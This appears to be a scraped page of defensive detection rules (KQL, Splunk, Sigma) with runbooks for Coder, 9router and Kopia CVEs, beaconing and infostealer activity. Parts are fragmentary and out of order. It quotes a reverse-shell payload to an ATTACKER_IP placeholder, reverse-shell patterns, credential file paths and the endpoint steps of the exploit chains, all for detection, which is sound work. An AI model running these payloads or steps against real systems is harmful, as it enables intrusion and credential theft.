  • Legitimate Azure-backed workspace agent registering then immediately fetching its SSH key and OAuth tokens at startup — same source IP because the agent runs inside the VM that made the POST
  • Coder agent reconnecting after a sustained outage and re-pulling all secrets at restart
  • Blue-team validation exercise replaying the advisory PoC against a patched instance
  • Coder admin manually invoking the agent CLI to inspect credentials from inside a workspace
  • Outbound NAT consolidating multiple workspace VMs to one egress IP, making the legitimate flow look correlated
Suppression filter
| where AuthUA != ExfilUA or DelaySec <= 60    // legit agent uses same UA across both calls; attacker pulling tokens from a different host typically has a different UA, but the rapid (<60s) window also catches automated chained exploits
Response runbook
1) TRIAGE: confirm the source IP corresponds to a legitimate workspace VM in the Azure subscription used by Coder — query the Azure VM inventory by IP. If the source IP is outside the org's Azure ranges, treat as confirmed compromise. Check the Coder server version against the patched list. 2) CONTAIN: revoke the agent session token for the affected vmId (Coder admin API: DELETE /api/v2/workspaceagents/{id}/sessiontoken), rotate the user's Git SSH key on GitHub/GitLab/Bitbucket, revoke any OAuth tokens for external_auth providers attached to that workspace. Block the suspect source IP at the WAF. 3) HUNT: search GitHub/GitLab/Bitbucket audit logs for activity by the affected user identity in the window after the exfil — look for clones to unfamiliar repos, push events to unexpected branches, new SSH keys added to the account, and OAuth-app authorisation grants. Roll forward to patched Coder version before reopening the endpoint.
let Lookback = 7d;
let WindowSec = 1800;
let Auth = ImWebSession
    | where TimeGenerated > ago(Lookback)
    | where HttpMethod == "POST"
    | where Url has "/api/v2/workspaceagents/azure-instance-identity"
    | where HttpStatusCode in ("200","204","")
    | project AuthTime = TimeGenerated, SrcIpAddr, DstHostname, AuthUrl = Url, AuthUA = HttpRequestHeaderUserAgent;
let Exfil = ImWebSession
    | where TimeGenerated > ago(Lookback)
    | where HttpMethod == "GET"
    | where Url has_any ("/workspaceagents/me/gitsshkey", "/workspaceagents/me/external-auth")
    | where HttpStatusCode in ("200","")
    | project ExfilTime = TimeGenerated, SrcIpAddr, DstHostname, ExfilUrl = Url, ExfilUA = HttpRequestHeaderUserAgent;
Auth
| join kind=inner Exfil on SrcIpAddr, DstHostname
| where ExfilTime between (AuthTime .. AuthTime + WindowSec * 1s)
| extend DelaySec = datetime_diff('second', ExfilTime, AuthTime)
| project AuthTime, ExfilTime, DelaySec, SrcIpAddr, DstHostname, AuthUrl, ExfilUrl, AuthUA, ExfilUA
| order by AuthTime desc

Coder CVE-2026-46354 - Inventory of vulnerable Coder v2 versions AIReconnaissance High
Hygiene hunt: enumerate all hosts running an unpatched Coder v2 server using Defender TVM CVE data and surface those that are internet-facing first. The advisory lists six patched lines (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5); anything earlier on each line is exploitable without authentication. Pairs with UC1/UC2 to prioritise instances that need either immediate patching or a switch to token-based agent auth. Rationale: DeviceTvmSoftwareVulnerabilities is the canonical Defender table for CVE-based exposure tracking; pairing with DeviceInfo's IsInternetFacing flag surfaces the highest-risk hosts first. The CVE ID and patched-version list come directly from the GHSA advisory body. Datadog logs and Falcon FDR don't carry SBOM/CVE rollups in their standard log tables, so those fields are empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://github.com/coder/coder/pull/25286
ATT&CKT1190
Data sourcesVulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • TVM lag — a host already patched within the last few hours may still appear vulnerable until the next inventory refresh
  • Coder running inside a container whose underlying base image was patched but the running container hasn't been redeployed
  • Internal lab / sandbox Coder instances intentionally left on an old version for regression testing
  • Air-gapped Coder deployments where the patched binary has been built but not signalled to TVM
  • Coder fork or vendored build whose version string doesn't match the upstream semver TVM expects
Response runbook
1) TRIAGE: for each returned host, confirm Coder process is actually running (DeviceProcessEvents | where FileName has "coder" within 24h) and that the version string in TVM matches the running binary — TVM occasionally lags. Prioritise hosts where IsInternetFacing == true. 2) CONTAIN: for any internet-facing unpatched host, apply the advisory workaround immediately — reconfigure Azure templates so coder_agent.auth = "token" and inject CODER_AGENT_TOKEN via the agent init script, then schedule the patched-line upgrade (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5 depending on minor in use). 3) HUNT: for every vulnerable host found, run UC2 (PKCS#7 token redemption correlation) over the last 90 days to determine whether the flaw was already exploited before patching; if any hits, treat as confirmed compromise and rotate workspace agent tokens, Git SSH keys, and external_auth OAuth tokens.

| project DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate, VulnerabilitySeverityLevel, PublicIP, IsInternetFacing, OSPlatform, MachineGroup
| order by IsInternetFacing desc, VulnerabilitySeverityLevel desc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-46354"
| join kind=leftouter (
    DeviceInfo
    | summarize arg_max(TimeGenerated, PublicIP, IsInternetFacing, OSPlatform, MachineGroup) by DeviceId
  ) on DeviceId

9router unauthenticated RCE — POST /api/cli-tools/cowork-settings with customPlugins.command AIExploitation High
Detects HTTP POST to the unauthenticated 9router cowork-settings endpoint with a customPlugins array containing an executable command field — the registration step of CVE-2026-46339 RCE before the SSE-triggered spawn(). Default Docker exposure is 0.0.0.0:20128. Rationale: The article names the exact vulnerable POST endpoint /api/cli-tools/cowork-settings (src/app/api/cli-tools/cowork-settings/route.js lines 292-319) and the Docker default port 20128. Any external unauthenticated POST to this path is exploitation by definition since the route is unguarded by middleware (src/proxy.js matcher) and the customPlugins.command/args fields are stored verbatim into globalThis.__9routerCustomPlugins. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate authenticated admin configuring custom MCP plugins via the 9router dashboard from an internal IP
  • Health-check / monitoring probes hitting the endpoint with an empty body
  • 9router self-tests during CI/CD or container build
  • Internal developer instances during plugin development testing
Suppression filter
| where SrcIpAddr !in ("127.0.0.1","::1") and not (ipv4_is_private(SrcIpAddr))
Response runbook
Step 1: Triage — confirm the source IP is external/untrusted and inspect the POST body for customPlugins[].command containing /bin/sh, /bin/bash, curl, wget, or python; pivot for any subsequent GET to /api/mcp/<name>/sse from the same source IP within 60 seconds. Step 2: Contain — block the source IP at perimeter, stop the 9router container or revoke port 20128 exposure, preserve docker logs and request body for forensics. Step 3: Hunt — on the host: list child processes of node since the POST timestamp, audit reads of ~/.claude/settings.json, ~/.aws/credentials, $DATA_DIR/db.sqlite; check cron/systemd for persistence and docker-group abuse for container escape.
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url has "/api/cli-tools/cowork-settings"
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router CVE-2026-46339 — GET /api/mcp/{plugin}/sse triggers stored command spawn() AIExploitation High
Detects unauthenticated HTTP GET to /api/mcp/<plugin>/sse on 9router — the second step of CVE-2026-46339 that invokes Node.js spawn() with the attacker-controlled command/args previously registered via /api/cli-tools/cowork-settings. Time-to-exploit from registration is under 2 seconds. Rationale: The article names the exact trigger endpoint /api/mcp/<plugin>/sse (src/app/api/mcp/[plugin]/sse/route.js lines 6-25) and identifies it as the unguarded GET that invokes spawn() with attacker-supplied command/args. Pairing this UC with the POST-registration UC gives the analyst the full two-step exploit chain on the wire and is high-fidelity because the route is normally only used by authenticated dashboard sessions. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

9router Node.js process spawning shell binary (CVE-2026-46339 post-exploit) AIInstallation High
Detects /bin/sh, /bin/bash or other shells spawned with node (server.js / next-server) as the parent process — direct host-side evidence of CVE-2026-46339 plugin-bridge RCE where attacker-controlled command/args reach Node's spawn() via the MCP stdio→SSE bridge. Rationale: The article describes the exact code path src/lib/mcp/stdioSseBridge.js line 138 calling spawn(plugin.command, plugin.args) with attacker-controlled values. The PoC payloads use /bin/sh -c and /bin/bash -i directly, so a node→shell parent-child pair on a 9router host is high-fidelity exploitation evidence — Node.js apps in production rarely shell out to /bin/sh directly. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate MCP plugin built on node-pty or shell-out wrappers (e.g. an MCP plugin that wraps a CLI tool such as ripgrep or kubectl)
  • Node app legitimately invoking shell for system calls (uncommon in production Node services)
  • Build/CI scripts running npm/yarn that spawn shells via node lifecycle hooks
  • Diagnostics or admin scripts run by an operator inside the 9router container
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("npm","yarn","pnpm","node_modules/.bin"))
| where ProcessCommandLine !contains "npm install" and ProcessCommandLine !contains "yarn install"
Response runbook
Step 1: Triage — pull the full ProcessCommandLine and check for reverse-shell patterns (`-i`, `/dev/tcp/`, `nc -e`, `bash -c`, `curl | sh`); correlate with web logs for a preceding POST to /api/cli-tools/cowork-settings and GET to /api/mcp/<name>/sse within 60 seconds. Step 2: Contain — kill the spawned shell PID, snapshot the container/VM, stop the 9router service, rotate any secrets exposed in process env (ANTHROPIC_AUTH_TOKEN, AWS keys, db.sqlite contents). Step 3: Hunt — pivot to outbound connections from the shell PID (DeviceNetworkEvents where InitiatingProcessParentFileName=node), check for docker-group container escape attempts, audit cron/systemd for persistence, and review ~/.aws, ~/.claude, $DATA_DIR/db.sqlite for tampering.

Reverse shell from 9router-spawned shell — outbound TCP from node-child bash AICommand & Control Medium
Detects outbound network connections originating from /bin/bash or /bin/sh processes whose parent is node — the typical reverse-shell post-exploitation pattern of CVE-2026-46339, including the PoC payload `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. Rationale: The article's PoC explicitly shows `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` as the reverse-shell payload registered via customPlugins.args. Detecting node→bash→outbound-TCP at the EDR layer catches the actual exploitation impact even when web-tier logs are unavailable (reverse-proxy not in scope or container egress). Sentinel KQL omitted: ImNetworkSession lacks initiating-process correlation fields and Linux Syslog/auditd entries reach Sentinel without the structured parent-process linkage needed for high fidelity. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes

  • Healthcheck or telemetry scripts that curl external endpoints from within the container

Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695) AIExploitation High
Detects exploitation of Kopia's unauthenticated SFTP/externalSSH path injection. When the vulnerable /api/v1/repo/exists handler invokes blob.NewStorage with attacker-supplied sshArguments, the kopia process directly forks ssh with a -oProxyCommand= token that OpenSSH then executes via $SHELL -c. The kopia→ssh parent/child with ProxyCommand in the child argv is a near-zero-FP signature of this RCE. Rationale: Uses the exact narrow signature described in the advisory: kopia process (vulnerable handler) directly invoking exec.CommandContext("ssh", ...) with a ProxyCommand token. The string 'ProxyCommand' in an ssh argv whose parent is kopia has effectively no benign use case outside intentional SFTP jump-host setups. Cross-checked against the GHSA advisory, the Kopia v0.22.3 source references in the article, and the fix PR #5354. Cross-checked against: • https://github.com/kopia/kopia/pull/5354 • https://github.com/kopia/kopia/blob/v0.22.3/repo/blob/sftp/sftp_storage.go • https://nvd.nist.gov/vuln/detail/CVE-2026-45695
ATT&CKT1190 T1059.004 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Kopia operator manually configuring an SFTP repository through a corporate SSH bastion using ProxyCommand
  • Internal automation/Ansible role that sets up Kopia SFTP backends with a documented ProxyCommand to traverse network segmentation
  • Backup admin testing externalSSH SFTP configuration against an internal hardened jump host
  • Red-team exercise simulating CVE-2026-45695 exploitation
Suppression filter
| where not (DeviceName in~ ("backup-bastion-01","backup-bastion-02") and InitiatingProcessCommandLine has "server start" and InitiatingProcessCommandLine has "--tls-cert" and ProcessCommandLine has_any ("bastion.internal","jump.corp.local"))
Response runbook
Step 1 (triage): Capture the full child ssh command line and any subsequent child processes of that ssh PID (look for /bin/sh -c, bash -c, cmd.exe /c). Pull the kopia HTTP access log for the same host around the event time and grep for POST /api/v1/repo/exists; capture the source IP. Confirm whether kopia was started with --without-password and bound to a non-loopback interface. Step 2 (contain): Stop the kopia server process immediately, block inbound to the Kopia HTTP port (default 51515) at the host firewall, and isolate the host if any shell child of ssh was observed. Rotate any credentials/keys reachable from the kopia process user. Step 3 (hunt): Sweep all hosts running kopia <= 0.22.3 for the same parent/child pattern over the last 30 days, query egress for the kopia HTTP port from untrusted networks, and review the kopia process user's bash/zsh history and crontabs for persistence dropped during the window.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where FileName in~ ("ssh","ssh.exe")
| where ProcessCommandLine has "ProxyCommand"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FolderPath, ProcessCommandLine, ProcessId, InitiatingProcessId, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where ActingProcessName has_any ("ssh","ssh.exe")
| where ActingProcessCommandLine has "ProxyCommand"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ActingProcessId
| order by TimeGenerated desc

id: 7c6f8e2a-3b21-4d8b-b9f6-9a4d0c1f5e21
description: Detects exploitation of Kopia CVE-2026-45695 where the unauthenticated /api/v1/repo/exists handler triggers the kopia process to invoke ssh with an attacker-controlled -oProxyCommand= argument, leading to command execution as the kopia user.
references:

SSH process spawned by Kopia invokes a shell child (ProxyCommand execution) AIInstallation High
Detects the second-stage execution arm of CVE-2026-45695: OpenSSH evaluates -oProxyCommand=<cmd> by invoking $SHELL -c <cmd> before any TCP connect. The resulting kopia → ssh → (sh|bash|cmd|powershell) grand-parent/parent/child chain is the artifact of arbitrary code running as the kopia service account. Rationale: This is the exact execution chain the advisory describes — OpenSSH spawns $SHELL -c <attacker_cmd> before attempting TCP, so the shell child of ssh is the observable smoking gun. Pairing it with a kopia grand-parent (via SshPid join) removes essentially all benign ssh ProxyCommand use. Confirmed against the GHSA advisory text and OpenSSH ProxyCommand documented behaviour. Cross-checked against: • https://github.com/advisories/GHSA-2q4c-3mrw-63c3 • https://man.openbsd.org/ssh_config.5#ProxyCommand • https://github.com/kopia/kopia/pull/5354
ATT&CKT1059.004 T1059.001 T1059.003 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Kopia SFTP backend deliberately configured with ProxyCommand=nc/corkscrew through a corporate proxy
  • Backup admin manually launching ssh via the kopia CLI session with a ProxyCommand for jump-host traversal
  • Misconfigured backup automation that wraps ssh with a netcat-based tunnel
  • Diagnostic ssh invocation by the kopia process user during troubleshooting
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("corkscrew","nc -X","connect-proxy") and DeviceName startswith "backup-")
Response runbook
Step 1 (triage): Capture the ShellCmd value — this is the literal attacker payload. Resolve the source IP of the originating POST /api/v1/repo/exists in the kopia application log and the Kopia HTTP port's network logs. Verify Kopia version is <= 0.22.3 and check for --without-password flag in the kopia systemd unit / launch args. Step 2 (contain): Kill the spawned shell PID and any descendants, stop the kopia service, firewall-block the Kopia HTTP listener from non-loopback, and put the host into containment if the shell ran anything beyond a no-op probe. Preserve memory and the kopia binary for forensics. Step 3 (hunt): Search 30 days of process telemetry for ssh→shell children whose ssh grand-parent was kopia. Pivot on the kopia service user to find any new cron entries, ~/.ssh/authorized_keys mutations, SUID drops, or outbound C2 connections. Identify all internet-reachable Kopia instances in the org and confirm patch status.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Microsoft's durabletask package on PyPi Compromised. Mini Shai Hulud attacks aga
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · OAuth consent / suspicious app grant

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"

Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)

// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs

         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when

    vendor.
references:

date: 2026/05/02

    category: process_creation

            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'

            - '\wmic.exe'

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"

let BadHashes = dynamic(["069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc"]);

| order by TimeGenerated desc
